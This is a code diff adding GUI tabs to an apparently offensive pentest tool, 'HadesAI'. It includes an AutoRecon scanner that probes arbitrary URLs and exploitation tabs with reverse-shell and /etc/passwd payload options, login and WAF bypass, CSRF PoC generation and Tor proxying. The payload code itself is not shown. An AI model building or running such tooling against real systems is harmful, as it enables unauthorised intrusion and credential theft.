+        self._add_chat_message("system", "🛡️ Network Monitor ACTIVATED - Watching for threats...")
+        
+    def _stop_network_monitor(self):
+        if self.network_monitor:
+            self.network_monitor.stop()
+            self.network_monitor.wait()
+            
+        self.monitor_start_btn.setEnabled(True)
+        self.monitor_stop_btn.setEnabled(False)
+        self.net_status_label.setText("🔴 Network Monitor STOPPED")
+        self._add_chat_message("system", "🔴 Network Monitor stopped")
+    def _create_web_knowledge_tab(self) -> QWidget:
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        title = QLabel("📡 AI Knowledge From Web Ingestion")
+        title.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
+        title.setStyleSheet("color: #e94560;")
+        layout.addWidget(title)
+
+        self.web_knowledge_display = QTextEdit()
+        self.web_knowledge_display.setReadOnly(True)
+        self.web_knowledge_display.setFont(QFont("Consolas", 11))
+        layout.addWidget(self.web_knowledge_display)
+
+        refresh_btn = QPushButton("🔁 Refresh Web Knowledge")
+        refresh_btn.clicked.connect(self._display_recent_web_knowledge)
+        layout.addWidget(refresh_btn)
+
+        return widget
+    def _refresh_module_list(self):
+        from os import listdir
+        from os.path import isfile, join
+
+        module_path = "modules"
+        self.module_list.clear()
+        if not os.path.exists(module_path):
+            os.makedirs(module_path)
+
+        for f in listdir(module_path):
+            if f.endswith(".py") and isfile(join(module_path, f)):
+                self.module_list.addItem(f[:-3])  # strip .py
+
+    def _load_selected_module(self):
+        import importlib.util
+
+        selected = self.module_list.currentItem()
+        if not selected:
+            self.module_output.append("[!] No module selected.")
+            return
+        module_name = selected.text()
+        
+        if module_name in loaded_modules:
+            self.module_output.append(f"[!] Module '{module_name}' is already loaded.")
+            return
+            
+        module_path = os.path.join("modules", f"{module_name}.py")
+
+        spec = importlib.util.spec_from_file_location(module_name, module_path)
+        module = importlib.util.module_from_spec(spec)
+        try:
+            spec.loader.exec_module(module)
+            loaded_modules[module_name] = module
+            self.exec_btn.setEnabled(True)
+            self.module_output.append(f"[+] Module '{module_name}' loaded successfully.")
+            self._refresh_loaded_modules_list()
+        except Exception as e:
+            self.module_output.append(f"[!] Failed to load '{module_name}': {e}")
+
+    def _execute_selected_module(self):
+        selected = self.loaded_modules_list.currentItem()
+        if not selected:
+            self.module_output.append("[!] No loaded module selected.")
+            return
+            
+        module_name = selected.text()
+        module = loaded_modules.get(module_name)
+        
+        if not module:
+            self.module_output.append(f"[!] Module '{module_name}' not found in loaded modules.")
+            return
+            
+        try:
+            if hasattr(module, "main"):
+                result = module.main()
+                self.module_output.append(f"[✔] Executed '{module_name}': {result}")
+            else:
+                self.module_output.append(f"[!] Module '{module_name}' has no 'main()' method.")
+        except Exception as e:
+            self.module_output.append(f"[✖] Execution of '{module_name}' failed: {e}")
+
+    def _unload_selected_module(self):
+        selected = self.loaded_modules_list.currentItem()
+        if not selected:
+            self.module_output.append("[!] No loaded module selected.")
+            return
+            
+        module_name = selected.text()
+        if module_name in loaded_modules:
+            del loaded_modules[module_name]
+            self.module_output.append(f"[-] Module '{module_name}' unloaded.")
+            self._refresh_loaded_modules_list()
+            if not loaded_modules:
+                self.exec_btn.setEnabled(False)
+        else:
+            self.module_output.append(f"[!] Module '{module_name}' not found.")
+
+    def _refresh_loaded_modules_list(self):
+        self.loaded_modules_list.clear()
+        for module_name in loaded_modules.keys():
+            self.loaded_modules_list.addItem(module_name)
+        self.exec_btn.setEnabled(len(loaded_modules) > 0)
+    def _toggle_defense_mode(self, enabled: bool):
+        if self.network_monitor:
+            self.network_monitor.set_defense_mode(enabled)
+        mode = "ENABLED" if enabled else "DISABLED"
+        self._add_chat_message("system", f"⚔️ Active Defense Mode {mode}")
+    def _display_recent_web_knowledge(self):
+        recent_patterns = self.ai.kb.fetch_recent_web_patterns(limit=5)
+        if recent_patterns:
+            summary = "\n\n".join(
+                f"[Set {i+1}]\n" + "\n".join(
+                    f"- {p.get('pattern_type', 'Unknown')}: {p.get('signature', '')}" for p in patterns
+                )
+                for i, patterns in enumerate(recent_patterns)
+            )
+        else:
+            summary = "No recent web-based learning data found."
+
+        self.output_display.setPlainText(f"[HadesAI :: Web Knowledge]\n\n{summary}")
+    def _toggle_learning_mode(self, enabled: bool):
+        if self.network_monitor:
+            self.network_monitor.set_learning_mode(enabled)
+    def _create_autorecon_tab(self) -> QWidget:
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        instructions = QLabel("Enter a URL below and HADES AI will autonomously analyze it for flaws.")
+        instructions.setWordWrap(True)
+        layout.addWidget(instructions)
+
+        self.autorecon_url_input = QLineEdit()
+        self.autorecon_url_input.setPlaceholderText("https://example.com")
+        layout.addWidget(self.autorecon_url_input)
+
+        self.autorecon_start_btn = QPushButton("Start AutoRecon")
+        self.autorecon_start_btn.clicked.connect(self._start_autorecon_scan)
+        layout.addWidget(self.autorecon_start_btn)
+
+        self.autorecon_output = QTextEdit()
+        self.autorecon_output.setReadOnly(True)
+        self.autorecon_output.setFont(QFont("Consolas", 10))
+        layout.addWidget(self.autorecon_output)
+
+        return widget        
+    def _on_connection_detected(self, conn: dict):
+        row = self.connection_table.rowCount()
+        if row >= 100:
+            self.connection_table.removeRow(0)
+            row = 99
+        self.connection_table.insertRow(row)
+        
+        self.connection_table.setItem(row, 0, QTableWidgetItem(conn.get('timestamp', '')[-8:]))
+        self.connection_table.setItem(row, 1, QTableWidgetItem(conn.get('remote_addr', 'N/A')[:25]))
+        self.connection_table.setItem(row, 2, QTableWidgetItem(str(conn.get('local_port', ''))))
+        self.connection_table.setItem(row, 3, QTableWidgetItem(conn.get('process', 'Unknown')[:15]))
+        self.connection_table.setItem(row, 4, QTableWidgetItem(conn.get('status', '')))
+        
+        threat = conn.get('threat_level', 'SAFE')
+        threat_item = QTableWidgetItem(threat)
+        if threat == 'SAFE':
+            threat_item.setForeground(QColor('#4CAF50'))
+        self.connection_table.setItem(row, 5, threat_item)
+        
+        self.connection_table.scrollToBottom()
+        
+    def _on_threat_detected(self, conn: dict):
+        row = self.threat_table.rowCount()
+        self.threat_table.insertRow(row)
+        
+        self.threat_table.setItem(row, 0, QTableWidgetItem(conn.get('timestamp', '')[-8:]))
+        self.threat_table.setItem(row, 1, QTableWidgetItem(conn.get('remote_ip', 'N/A')))
+        self.threat_table.setItem(row, 2, QTableWidgetItem(conn.get('threat_type', 'Unknown')))
+        
+        level = conn.get('threat_level', 'WARNING')
+        level_item = QTableWidgetItem(level)
+        colors = {'CRITICAL': '#ff0000', 'HIGH': '#ff6b6b', 'WARNING': '#ffa500'}
+        level_item.setForeground(QColor(colors.get(level, '#ffa500')))
+        self.threat_table.setItem(row, 3, level_item)
+        
+        details = ', '.join(conn.get('threat_details', []))[:50]
+        self.threat_table.setItem(row, 4, QTableWidgetItem(details))
+        
+        self.threat_table.scrollToBottom()
+        
+        # Also add to chat
+        self._add_chat_message("threat", f"⚠️ [{level}] {conn.get('threat_type')}: {conn.get('remote_addr')} - {details}")
+        
+    def _on_monitor_status(self, status: str):
+        self.net_status_label.setText(status)
+        
+    def _on_stats_update(self, stats: dict):
+        for key, value in stats.items():
+            if key in self.net_stats_labels:
+                self.net_stats_labels[key].setText(str(value))
+                
+    def _manual_block_ip(self):
+        ip = self.block_ip_input.text().strip()
+        if ip and self.network_monitor:
+            self.network_monitor.block_ip(ip)
+            self.block_ip_input.clear()
+            self._add_chat_message("system", f"🚫 Manually blocked IP: {ip}")
+            
+    def _manual_unblock_ip(self):
+        ip = self.block_ip_input.text().strip()
+        if ip and self.network_monitor:
+            self.network_monitor.unblock_ip(ip)
+            self.block_ip_input.clear()
+            self._add_chat_message("system", f"✅ Unblocked IP: {ip}")
+            
+    def _clear_threat_log(self):
+        self.threat_table.setRowCount(0)
+        if self.network_monitor:
+            self.network_monitor.threat_log.clear()
+        self._add_chat_message("system", "🗑️ Threat log cleared")
+        
+    def _create_tools_tab(self) -> QWidget:
+        widget = QWidget()
+        layout = QHBoxLayout(widget)
+        
+        left = QGroupBox("Tool Selection")
+        left_layout = QVBoxLayout(left)
+        
+        left_layout.addWidget(QLabel("Target:"))
+        self.target_input = QLineEdit()
+        self.target_input.setPlaceholderText("IP, domain, or URL...")
+        left_layout.addWidget(self.target_input)
+        
+        left_layout.addWidget(QLabel("Tool:"))
+        self.tool_combo = QComboBox()
+        self.tool_combo.addItems(['Port Scan', 'Directory Bruteforce', 'Subdomain Enum', 'Banner Grab', 'Vulnerability Scan', 'Learn from URL'])
+        left_layout.addWidget(self.tool_combo)
+        
+        self.run_tool_btn = QPushButton("▶ Run Tool")
+        self.run_tool_btn.clicked.connect(self._run_tool)
+        left_layout.addWidget(self.run_tool_btn)
+        
+        self.stop_tool_btn = QPushButton("⏹ Stop")
+        self.stop_tool_btn.setEnabled(False)
+        self.stop_tool_btn.clicked.connect(self._stop_tool)
+        left_layout.addWidget(self.stop_tool_btn)
+        
+        self.tool_progress = QProgressBar()
+        left_layout.addWidget(self.tool_progress)
+        
+        left_layout.addStretch()
+        layout.addWidget(left, 1)
+        
+        right = QGroupBox("Output")
+        right_layout = QVBoxLayout(right)
+        self.tool_output = QPlainTextEdit()
+        self.tool_output.setReadOnly(True)
+        self.tool_output.setFont(QFont("Consolas", 10))
+        right_layout.addWidget(self.tool_output)
+        
+        self.findings_table = QTableWidget()
+        self.findings_table.setColumnCount(3)
+        self.findings_table.setHorizontalHeaderLabels(["Finding", "Details", "Status"])
+        self.findings_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
+        self.findings_table.setMaximumHeight(200)
+        right_layout.addWidget(self.findings_table)
+        
+        layout.addWidget(right, 2)
+        return widget
+    def _start_autorecon_scan(self):
+        import requests
+        from urllib.parse import urlparse, urlencode
+        import hashlib
+
+        url = self.autorecon_url_input.text().strip()
+
+        # ---- URL validation ----
+        if not url.startswith(("http://", "https://")):
+            self.autorecon_output.setPlainText("❌ Please enter a valid URL (http:// or https://).")
+            return
+
+        self.autorecon_output.append(f"🔎 Scanning {url}...\n")
+
+        findings = []
+        patterns = []
+        exploits = []
+
+        headers = {
+            "User-Agent": "HadesAI-AutoRecon/1.0"
+        }
+
+        try:
+            response = requests.get(url, headers=headers, timeout=10)
+            content = response.text[:50000]  # safety limit
+        except Exception as e:
+            self.autorecon_output.append(f"❌ Request failed: {e}")
+            return
+
+        # -------------------------------
+        # 1. Passive HTML / Header Checks
+        # -------------------------------
+        security_headers = [
+            "Content-Security-Policy",
+            "X-Frame-Options",
+            "X-Content-Type-Options",
+            "Strict-Transport-Security",
+            "Referrer-Policy"
+        ]
+
+        missing_headers = [
+            h for h in security_headers if h not in response.headers
+        ]
+
+        if missing_headers:
+            patterns.append({
+                "pattern_type": "Missing Security Headers",
+                "signature": ", ".join(missing_headers),
+                "confidence": 0.6
+            })
+
+            exploits.append({
+                "source_url": url,
+                "exploit_type": "Misconfiguration",
+                "code": "HTTP Response Headers",
+                "description": (
+                    "The following security headers were missing: "
+                    f"{', '.join(missing_headers)}.\n\n"
+                    "Reproduction:\n"
+                    "1. Send a GET request to the site\n"
+                    "2. Inspect response headers\n"
+                    "3. Confirm missing protections"
+                )
+            })
+
+        # -------------------------------
+        # 2. Reflected Input Test (XSS-lite)
+        # -------------------------------
+        test_payload = "<hades_test>"
+        parsed = urlparse(url)
+        test_query = urlencode({"test": test_payload})
+        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
+
+        try:
+            test_resp = requests.get(test_url, headers=headers, timeout=10)
+            if test_payload in test_resp.text:
+                patterns.append({
+                    "pattern_type": "Reflected Input",
+                    "signature": test_payload,
+                    "confidence": 0.85
+                })
+
+                exploits.append({
+                    "source_url": test_url,
+                    "exploit_type": "Reflected Input / Potential XSS",
+                    "code": test_payload,
+                    "description": (
+                        "User-supplied input was reflected in the response without sanitization.\n\n"
+                        "Reproduction:\n"
+                        f"1. Navigate to:\n   {test_url}\n"
+                        "2. Observe reflected payload in response body\n"
+                        "3. Replace payload with script to test XSS safely"
+                    )
+                })
+        except:
+            pass
+
+        # -------------------------------
+        # 3. Basic Directory Guessing (passive)
+        # -------------------------------
+        common_paths = ["/admin", "/login", "/backup", "/.git/"]
+        for path in common_paths:
+            try:
+                r = requests.get(url.rstrip("/") + path, headers=headers, timeout=5)
+                if r.status_code in (200, 401, 403):
+                    patterns.append({
+                        "pattern_type": "Exposed Endpoint",
+                        "signature": path,
+                        "confidence": 0.7
+                    })
+
+                    exploits.append({
+                        "source_url": url.rstrip("/") + path,
+                        "exploit_type": "Exposed Endpoint",
+                        "code": path,
+                        "description": (
+                            f"Endpoint {path} is accessible (status {r.status_code}).\n\n"
+                            "Reproduction:\n"
+                            f"1. Visit {url.rstrip('/') + path}\n"
+                            "2. Observe access behavior"
+                        )
+                    })
+            except:
+                continue
+
+        # -------------------------------
+        # 4. Store Results
+        # -------------------------------
+        for e in exploits:
+            self.ai.kb.store_learned_exploit(
+                source_url=e["source_url"],
+                exploit_type=e["exploit_type"],
+                code=e["code"],
+                description=e["description"]
+            )
+
+        if patterns or exploits:
+            self.ai.kb.store_web_learning(
+                url=url,
+                content_type="html",
+                patterns=patterns,
+                exploits=exploits
+            )
+
+        # -------------------------------
+        # 5. Display Results
+        # -------------------------------
+        if not patterns:
+            self.autorecon_output.append("ℹ️ No obvious issues detected.\n")
+        else:
+            for p in patterns:
+                self.autorecon_output.append(
+                    f"[{p['pattern_type']}] {p['signature']} | Confidence: {p['confidence']:.2f}"
+                )
+
+        self.autorecon_output.append("\n✅ Findings stored with reproduction steps.")
+
+    def _create_findings_tab(self) -> QWidget:
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+        
+        btn_layout = QHBoxLayout()
+        refresh_btn = QPushButton("🔄 Refresh")
+        refresh_btn.clicked.connect(self._refresh_findings)
+        btn_layout.addWidget(refresh_btn)
+        btn_layout.addStretch()
+        layout.addLayout(btn_layout)
+        
+        splitter = QSplitter(Qt.Orientation.Vertical)
+        
+        self.findings_tree = QTreeWidget()
+        self.findings_tree.setHeaderLabels(["Type", "Severity", "Path", "Browser"])
+        self.findings_tree.setAlternatingRowColors(True)
+        self.findings_tree.itemClicked.connect(self._show_finding_detail)
+        splitter.addWidget(self.findings_tree)
+        
+        detail_group = QGroupBox("Code Snippet & Details")
+        detail_layout = QVBoxLayout(detail_group)
+        self.finding_code = QPlainTextEdit()
+        self.finding_code.setReadOnly(True)
+        self.finding_code.setFont(QFont("Consolas", 10))
+        self.code_highlighter = PythonHighlighter(self.finding_code.document())
+        detail_layout.addWidget(self.finding_code)
+        splitter.addWidget(detail_group)
+        
+        splitter.setSizes([400, 300])
+        layout.addWidget(splitter)
+        
+        self._refresh_findings()
+        return widget
+        
+    def _create_learned_tab(self) -> QWidget:
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+        
+        btn_layout = QHBoxLayout()
+        refresh_btn = QPushButton("🔄 Refresh")
+        refresh_btn.clicked.connect(self._refresh_learned)
+        btn_layout.addWidget(refresh_btn)
+        
+        self.learn_url = QLineEdit()
+        self.learn_url.setPlaceholderText("Enter URL to learn from...")
+        btn_layout.addWidget(self.learn_url)
+        
+        learn_btn = QPushButton("📚 Learn from URL")
+        learn_btn.clicked.connect(self._learn_from_url)
+        btn_layout.addWidget(learn_btn)
+        
+        export_pdf_btn = QPushButton("📄 Export to PDF")
+        export_pdf_btn.clicked.connect(self._export_to_pdf)
+        export_pdf_btn.setStyleSheet("background: #0f3460;")
+        btn_layout.addWidget(export_pdf_btn)
+        
+        self.clear_after_export = QCheckBox("Clear after export")
+        self.clear_after_export.setToolTip("Delete all findings, exploits, and cache entries after exporting")
+        self.clear_after_export.setStyleSheet("color: #ffa500;")
+        btn_layout.addWidget(self.clear_after_export)
+        
+        layout.addLayout(btn_layout)
+        
+        splitter = QSplitter(Qt.Orientation.Vertical)
+        
+        self.learned_table = QTableWidget()
+        self.learned_table.setColumnCount(4)
+        self.learned_table.setHorizontalHeaderLabels(["Type", "Source", "Learned", "Success Rate"])
+        self.learned_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
+        self.learned_table.itemClicked.connect(self._show_learned_code)
+        splitter.addWidget(self.learned_table)
+        
+        code_group = QGroupBox("Exploit Code")
+        code_layout = QVBoxLayout(code_group)
+        self.learned_code = QPlainTextEdit()
+        self.learned_code.setReadOnly(True)
+        self.learned_code.setFont(QFont("Consolas", 10))
+        code_layout.addWidget(self.learned_code)
+        splitter.addWidget(code_group)
+        
+        layout.addWidget(splitter)
+        
+        self._refresh_learned()
+        return widget
+        
+    def _create_cache_tab(self) -> QWidget:
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+        
+        control_layout = QHBoxLayout()
+        self.cache_scan_btn = QPushButton("🔎 Scan Browser Cache")
+        self.cache_scan_btn.clicked.connect(self._start_cache_scan)
+        control_layout.addWidget(self.cache_scan_btn)
+        
+        self.cache_stop_btn = QPushButton("⏹ Stop")
+        self.cache_stop_btn.setEnabled(False)
+        self.cache_stop_btn.clicked.connect(self._stop_cache_scan)
+        control_layout.addWidget(self.cache_stop_btn)
+        
+        control_layout.addStretch()
+        
+        self.cache_progress = QProgressBar()
+        self.cache_progress.setMaximumWidth(300)
+        control_layout.addWidget(self.cache_progress)
+        
+        layout.addLayout(control_layout)
+        
+        self.cache_tree = QTreeWidget()
+        self.cache_tree.setHeaderLabels(["Path", "Size", "Risk", "Browser", "Threats"])
+        self.cache_tree.setAlternatingRowColors(True)
+        layout.addWidget(self.cache_tree)
+        
+        stats_group = QGroupBox("Scan Statistics")
+        stats_layout = QHBoxLayout(stats_group)
+        self.cache_stats = QLabel("No scan performed yet")
+        self.cache_stats.setFont(QFont("Consolas", 10))
+        stats_layout.addWidget(self.cache_stats)
+        layout.addWidget(stats_group)
+        
+        return widget
+        
+    def _create_exploit_tab(self) -> QWidget:
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+        
+        # Target config
+        config_group = QGroupBox("Exploitation Target")
+        config_layout = QFormLayout(config_group)
+        
+        self.exploit_url = QLineEdit()
+        self.exploit_url.setPlaceholderText("http://target.com/vulnerable.php")
+        config_layout.addRow("Target URL:", self.exploit_url)
+        
+        self.exploit_param = QLineEdit()
+        self.exploit_param.setPlaceholderText("cmd")
+        config_layout.addRow("Parameter:", self.exploit_param)
+        
+        self.exploit_os = QComboBox()
+        self.exploit_os.addItems(['linux', 'windows'])
+        config_layout.addRow("Target OS:", self.exploit_os)
+        
+        self.exploit_type = QComboBox()
+        self.exploit_type.addItems(['whoami', 'id', 'ls', 'dir', 'pwd', 'cat_passwd', 
+                                    'ifconfig', 'netstat', 'ps', 'env', 'reverse_shell'])
+        config_layout.addRow("Payload Type:", self.exploit_type)
+        
+        self.attacker_ip = QLineEdit()
+        self.attacker_ip.setPlaceholderText("Your IP for reverse shells")
+        config_layout.addRow("Attacker IP:", self.attacker_ip)
+        
+        self.attacker_port = QLineEdit()
+        self.attacker_port.setText("4444")
+        config_layout.addRow("Attacker Port:", self.attacker_port)
+        
+        layout.addWidget(config_group)
+        
+        # Buttons
+        btn_layout = QHBoxLayout()
+        
+        gen_payloads_btn = QPushButton("⚡ Generate Payloads")
+        gen_payloads_btn.clicked.connect(self._generate_exploit_payloads)
+        btn_layout.addWidget(gen_payloads_btn)
+        
+        fuzz_btn = QPushButton("🎯 Fuzz Target")
+        fuzz_btn.clicked.connect(self._fuzz_target)
+        btn_layout.addWidget(fuzz_btn)
+        
+        layout.addLayout(btn_layout)
+        
+        # Results
+        self.exploit_results = QTableWidget()
+        self.exploit_results.setColumnCount(5)
+        self.exploit_results.setHorizontalHeaderLabels(["Payload", "Status", "Length", "Indicators", "Vulnerable"])
+        self.exploit_results.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
+        layout.addWidget(self.exploit_results)
+        
+        return widget
+        
+    def _create_injection_tab(self) -> QWidget:
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+        
+        # Target
+        target_layout = QHBoxLayout()
+        target_layout.addWidget(QLabel("Target URL:"))
+        self.injection_url = QLineEdit()
+        self.injection_url.setPlaceholderText("http://target.com/api/login")
+        target_layout.addWidget(self.injection_url)
+        layout.addLayout(target_layout)
+        
+        # Injection type
+        type_layout = QHBoxLayout()
+        type_layout.addWidget(QLabel("Injection Type:"))
+        self.injection_type = QComboBox()
+        self.injection_type.addItems(['Header Injection', 'JSON Injection', 'WAF Bypass'])
+        type_layout.addWidget(self.injection_type)
+        
+        self.json_payload_type = QComboBox()
+        self.json_payload_type.addItems(['injection', 'type_juggling', 'ssrf'])
+        type_layout.addWidget(self.json_payload_type)
+        
+        inject_btn = QPushButton("💉 Inject")
+        inject_btn.clicked.connect(self._run_injection)
+        type_layout.addWidget(inject_btn)
+        
+        layout.addLayout(type_layout)
+        
+        # Results
+        self.injection_results = QTableWidget()
+        self.injection_results.setColumnCount(5)
+        self.injection_results.setHorizontalHeaderLabels(["Header/Payload", "Value", "Status", "Length", "Interesting"])
+        self.injection_results.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
+        layout.addWidget(self.injection_results)
+        
+        return widget
+        
+    def _create_auth_bypass_tab(self) -> QWidget:
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+        
+        # Login bypass
+        login_group = QGroupBox("Login Bypass")
+        login_layout = QFormLayout(login_group)
+        
+        self.login_url = QLineEdit()
+        self.login_url.setPlaceholderText("http://target.com/login")
+        login_layout.addRow("Login URL:", self.login_url)
+        
+        self.user_field = QLineEdit()
+        self.user_field.setText("username")
+        login_layout.addRow("Username Field:", self.user_field)
+        
+        self.pass_field = QLineEdit()
+        self.pass_field.setText("password")
+        login_layout.addRow("Password Field:", self.pass_field)
+        
+        self.bypass_type = QComboBox()
+        self.bypass_type.addItems(['sql_auth_bypass', 'default_creds', 'nosql_bypass'])
+        login_layout.addRow("Bypass Type:", self.bypass_type)
+        
+        bypass_btn = QPushButton("🔓 Try Bypass")
+        bypass_btn.clicked.connect(self._try_login_bypass)
+        login_layout.addRow("", bypass_btn)
+        
+        layout.addWidget(login_group)
+        
+        # CSRF bypass
+        csrf_group = QGroupBox("CSRF Bypass")
+        csrf_layout = QFormLayout(csrf_group)
+        
+        self.csrf_url = QLineEdit()
+        self.csrf_url.setPlaceholderText("http://target.com/change-password")
+        csrf_layout.addRow("Target URL:", self.csrf_url)
+        
+        csrf_btn = QPushButton("🛡️ Test CSRF Bypass")
+        csrf_btn.clicked.connect(self._test_csrf_bypass)
+        csrf_layout.addRow("", csrf_btn)
+        
+        poc_btn = QPushButton("📝 Generate PoC")
+        poc_btn.clicked.connect(self._generate_csrf_poc)
+        csrf_layout.addRow("", poc_btn)
+        
+        layout.addWidget(csrf_group)
+        
+        # Results
+        self.auth_results = QTableWidget()
+        self.auth_results.setColumnCount(5)
+        self.auth_results.setHorizontalHeaderLabels(["Technique/Creds", "Status", "Length", "Potential Bypass", "Details"])
+        self.auth_results.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
+        layout.addWidget(self.auth_results)
+        
+        return widget
+        
+    def _create_proxy_tab(self) -> QWidget:
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+        
+        proxy_group = QGroupBox("Proxy Configuration")
+        proxy_layout = QFormLayout(proxy_group)
+        
+        self.proxy_enabled = QCheckBox("Enable Proxy")
+        self.proxy_enabled.stateChanged.connect(self._toggle_proxy)
+        proxy_layout.addRow("", self.proxy_enabled)
+        
+        self.proxy_type_combo = QComboBox()
+        self.proxy_type_combo.addItems(['tor', 'socks5', 'http', 'rotating'])
+        proxy_layout.addRow("Proxy Type:", self.proxy_type_combo)
+        
+        self.proxy_host_input = QLineEdit()
+        self.proxy_host_input.setText("127.0.0.1")
+        proxy_layout.addRow("Host:", self.proxy_host_input)
+        
+        self.proxy_port_input = QSpinBox()
+        self.proxy_port_input.setRange(1, 65535)
+        self.proxy_port_input.setValue(9050)
+        proxy_layout.addRow("Port:", self.proxy_port_input)
+        
+        self.proxy_user_input = QLineEdit()
+        self.proxy_user_input.setPlaceholderText("Optional")
+        proxy_layout.addRow("Username:", self.proxy_user_input)
+        
+        self.proxy_pass_input = QLineEdit()
+        self.proxy_pass_input.setEchoMode(QLineEdit.EchoMode.Password)
+        self.proxy_pass_input.setPlaceholderText("Optional")
+        proxy_layout.addRow("Password:", self.proxy_pass_input)
+        
+        layout.addWidget(proxy_group)
+        
+        # Rotating proxies
+        rotate_group = QGroupBox("Rotating Proxies (one per line)")
+        rotate_layout = QVBoxLayout(rotate_group)
+        self.proxy_list_input = QPlainTextEdit()
+        self.proxy_list_input.setPlaceholderText("http://proxy1:8080\nhttp://proxy2:8080\nsocks5://proxy3:1080")
+        self.proxy_list_input.setMaximumHeight(100)
+        rotate_layout.addWidget(self.proxy_list_input)
+        layout.addWidget(rotate_group)
+        
+        # Test & status
+        btn_layout = QHBoxLayout()
+        
+        save_btn = QPushButton("💾 Save Settings")
+        save_btn.clicked.connect(self._save_proxy_settings)
+        btn_layout.addWidget(save_btn)
+        
+        test_btn = QPushButton("🔌 Test Connection")
+        test_btn.clicked.connect(self._test_proxy)
+        btn_layout.addWidget(test_btn)
+        
+        layout.addLayout(btn_layout)
+        
+        self.proxy_status = QLabel("Proxy: Disabled")
+        self.proxy_status.setStyleSheet("font-size: 14px; padding: 10px;")
+        layout.addWidget(self.proxy_status)
+        
+        layout.addStretch()
+        return widget
+    
+    def _create_code_tab(self) -> QWidget:
+        widget = QWidget()
+        layout = QHBoxLayout(widget)
+        
+        left = QGroupBox("Code Input")
+        left_layout = QVBoxLayout(left)
+        self.code_input = QPlainTextEdit()
+        self.code_input.setPlaceholderText("Paste code to analyze...")
+        self.code_input.setFont(QFont("Consolas", 10))
+        left_layout.addWidget(self.code_input)
+        
+        analyze_btn = QPushButton("🔍 Analyze Code")
+        analyze_btn.clicked.connect(self._analyze_code)
+        left_layout.addWidget(analyze_btn)
+        layout.addWidget(left)
+        
+        right = QGroupBox("Vulnerabilities Found")
+        right_layout = QVBoxLayout(right)
+        self.vuln_tree = QTreeWidget()
+        self.vuln_tree.setHeaderLabels(["Type", "Severity", "Line", "Match"])
+        right_layout.addWidget(self.vuln_tree)
+        layout.addWidget(right)
+        
+        return widget
+    
+    def _create_code_helper_tab(self) -> QWidget:
+        """Code Helper tab - Apply AI instructions to transform code using GPT"""
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+        
+        # Info banner
+        info_label = QLabel("🤖 GPT-Powered Code Assistant - Analyze, modify, and improve code with AI")
+        info_label.setStyleSheet("background: #0f3460; padding: 10px; border-radius: 5px; font-size: 12px;")
+        layout.addWidget(info_label)
+        
+        # GPT Status
+        gpt_status = "✅ GPT Available" if HAS_OPENAI else "⚠️ GPT Not Available (pip install openai)"
+        gpt_label = QLabel(gpt_status)
+        gpt_label.setStyleSheet("color: #4CAF50;" if HAS_OPENAI else "color: #ff6b6b;")
+        layout.addWidget(gpt_label)
+        
+        # File loading section
+        file_group = QGroupBox("📂 File Operations")
+        file_layout = QHBoxLayout(file_group)
+        self.file_path_input = QLineEdit()
+        self.file_path_input.setPlaceholderText("Enter file path to load...")
+        file_layout.addWidget(self.file_path_input)
+        
+        load_btn = QPushButton("📂 Load File")
+        load_btn.clicked.connect(self._load_code_file)
+        load_btn.setStyleSheet("background: #0f3460;")
+        file_layout.addWidget(load_btn)
+        
+        browse_btn = QPushButton("📁 Browse")
+        browse_btn.clicked.connect(self._browse_code_file)
+        browse_btn.setStyleSheet("background: #0f3460;")
+        file_layout.addWidget(browse_btn)
+        
+        save_btn = QPushButton("💾 Save")
+        save_btn.clicked.connect(self._save_code_file)
+        save_btn.setStyleSheet("background: #4CAF50;")
+        file_layout.addWidget(save_btn)
+        layout.addWidget(file_group)
+        
+        # Code editor
+        code_group = QGroupBox("💻 Code Editor")
+        code_layout = QVBoxLayout(code_group)
+        self.code_helper_text = QPlainTextEdit()
+        self.code_helper_text.setPlaceholderText("Paste your code here or load a file...")
+        self.code_helper_text.setFont(QFont("Consolas", 10))
+        self.code_helper_text.setMinimumHeight(250)
+        PythonHighlighter(self.code_helper_text.document())
+        code_layout.addWidget(self.code_helper_text)
+        layout.addWidget(code_group)
+        
+        # Instruction section
+        instruction_group = QGroupBox("🎯 AI Instruction")
+        instruction_layout = QHBoxLayout(instruction_group)
+        self.code_instruction_input = QLineEdit()
+        self.code_instruction_input.setPlaceholderText("Enter instruction (e.g., 'add error handling', 'optimize this loop', 'find bugs', 'add docstrings')...")
+        self.code_instruction_input.returnPressed.connect(self._apply_code_instruction)
+        instruction_layout.addWidget(self.code_instruction_input)
+        
+        apply_btn = QPushButton("🚀 Apply with GPT")
+        apply_btn.clicked.connect(self._apply_code_instruction)
+        instruction_layout.addWidget(apply_btn)
+        
+        analyze_btn = QPushButton("🔍 Analyze")
+        analyze_btn.clicked.connect(self._gpt_analyze_code)
+        analyze_btn.setStyleSheet("background: #0f3460;")
+        instruction_layout.addWidget(analyze_btn)
+        
+        exec_btn = QPushButton("▶ Execute")
+        exec_btn.clicked.connect(self._execute_code)
+        exec_btn.setStyleSheet("background: #ff6b6b;")
+        instruction_layout.addWidget(exec_btn)
+        layout.addWidget(instruction_group)
+        
+        # Quick actions
+        quick_group = QGroupBox("⚡ Quick Actions")
+        quick_layout = QHBoxLayout(quick_group)
+        quick_actions = [
+            ("Add Error Handling", "add try/except error handling"),
+            ("Add Docstrings", "add docstrings to all functions"),
+            ("Find Bugs", "analyze for potential bugs and issues"),
+            ("Optimize", "optimize this code for performance"),
+            ("Add Logging", "add logging to all functions"),
+            ("Security Check", "check for security vulnerabilities"),
+        ]
+        for label, instruction in quick_actions:
+            btn = QPushButton(label)
+            btn.clicked.connect(lambda checked, i=instruction: self._quick_instruction(i))
